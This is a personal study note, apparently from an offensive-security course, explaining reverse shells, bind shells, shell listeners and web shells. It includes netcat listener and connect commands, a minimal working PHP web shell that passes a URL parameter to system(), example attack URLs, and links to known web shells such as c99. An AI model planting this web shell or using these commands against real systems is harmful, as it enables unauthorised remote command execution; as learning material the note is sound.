---
sr-due: 2025-06-04
sr-interval: 30
sr-ease: 170
---
#offensive_security
#review 

[[../2 - Tags/Offensive|Offensive]] [[../2 - Tags/Tools|Tools]]

Shells are commonly used in cybersecurity to remotely control systems. 

## Shell Overview

A shell is ;; a software that allows us to interact with an OS. In cybersecurity, it is common to refer to a specific shell session an attacker uses when accessing a compromised system. This will allow attacker to execute several different activities such as:

- Remote System Control
- Privilege Escalation
- Data Exfiltration
- Persistence and Maintaining Access
- Post Exploitation Activities
- Access Other System on the Network

## Reverse Shell

Also referred to as a connect back shell is one of the most popular techniques for gaining access to a system in a cyber attack. The connections initiate from the target system to the attacker's machine which helps avoid detection from security appliances.

### How Reverse Shells Work

**Set up a Netcat (nc) Listener**

```
nc -lvnp 443
```

<span style="color:rgb(255, 192, 0)">-l</span> listen
<span style="color:rgb(255, 192, 0)">-v</span> verbose
<span style="color:rgb(255, 192, 0)">-n</span> does not resolve DNS name
<span style="color:rgb(255, 192, 0)">-p</span> port

**Gaining Reverse Shell Access**

Once listener is set up, the attacker will then execute a reverse shell payload. This payload usually abuses the vulnerability or unauthorized access granted by the attacker and executes a command that will expose the shell through the network.

**Attacker Receives the Shell**

Once the above payload is executed, the attacker will receive a reverse shell, as shown below, allowing them to execute commands as if they were logging into a regular terminal in the OS.

## Bind Shell

Binds is;; a port on the compromised system and listen for a connection. When the connection occurs it exposes the shell session so the attacker can execute commands remotely.

This method can be used when outbound connections are not allowed but is less popular than reverse shell because it needs to remain active and listen for detections which can lead to detection

### How Bind Shells Work

**Set Up the Bind Shell on the Target**

Create a bind shell payload. Ports below 1024 need to be executed with elevated privileges so use a port higher than that. 

**Attacker Connects to the Bind Shell**

```
nc -nv TARGET_IP 8080
```

## Shell Listeners

- **Rlwrap** a small utility that uses the GNU readline library to provide editing keyboard and history.
- **Ncat**  is an improved version of Netcat distributed by the NMAP project. It provides extra features, like encryption (SSL).
- **Socat** allows you to create a socket connection between two data sources, in this case, two different hosts.
	- A socket connection is a software endpoint that enables two programs on a network to communicate, acting as a virtual "doorway" for data exchange



## Shell Payloads

A Shell Payload can be a command or script that exposes the shell to an incoming connection in the case of a bind shell or a send connection in the case of a reverse shell.

## Web Shell

A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. A web shell is usually a file containing the code that executes commands and handles files. It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers.

### Example PHP Web Shell


```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```


The shell can be saved into a file with the PHP extension, like shell.php, and then uploaded into the web server by the attacker by exploiting vulnerabilities such as **Unrestricted File Upload, File Inclusion, Command Injection**, among others, or by gaining unauthorized access to it. 

After the web shell is deployed in the server, it can be accessed through the URL where the web shell is hosted, in this example http://victim.com/uploads/shell.php. As we observed from the code in shell.php, we need to provide a GET method and the value of the variable cmd, which should contain the command the attacker wants to execute. For example, if we want to execute the command whoami the request to the URL should be:
http://victim.com/uploads/shell.php?cmd=whoami

### Existing Web Shells Available Online

[p0wny-shell](https://github.com/flozz/p0wny-shell) - A minimalistic single-file PHP web shell that allows remote command execution
[b374k shell](https://github.com/b374k/b374k) - A more feature-rich PHP web shell with file management and command execution, among other functionalities
[c99 shell](https://www.r57shell.net/single.php?id=13) - A well-known and robust PHP web shell with extensive functionality
You can find more web shells at: [https://www.r57shell.net/index.php](https://www.r57shell.net/index.php).


http://10.10.142.153:8082/uploads/shell.php?cmd=whoami